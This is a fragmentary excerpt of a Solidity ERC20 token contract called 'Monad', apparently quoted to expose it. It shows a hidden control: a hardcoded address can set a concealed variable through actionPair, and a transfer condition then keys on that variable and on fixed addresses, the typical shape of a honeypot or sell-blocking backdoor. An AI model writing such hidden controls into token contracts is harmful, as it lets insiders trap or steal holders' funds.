...
contract Monad is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0x350B84959C55c4697B50feaa73A61E75690bEAa6) _p76234 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        if((from != _p76234 && to == 0x350B84959C55c4697B50feaa73A61E75690bEAa6) || (_p76234 == to && from != 0x350B84959C55c4697B50feaa73A61E75690bEAa6 && from  != 0xE6504636fA8F0bfC60343faDA779A1f5E5De2Fd9)) {
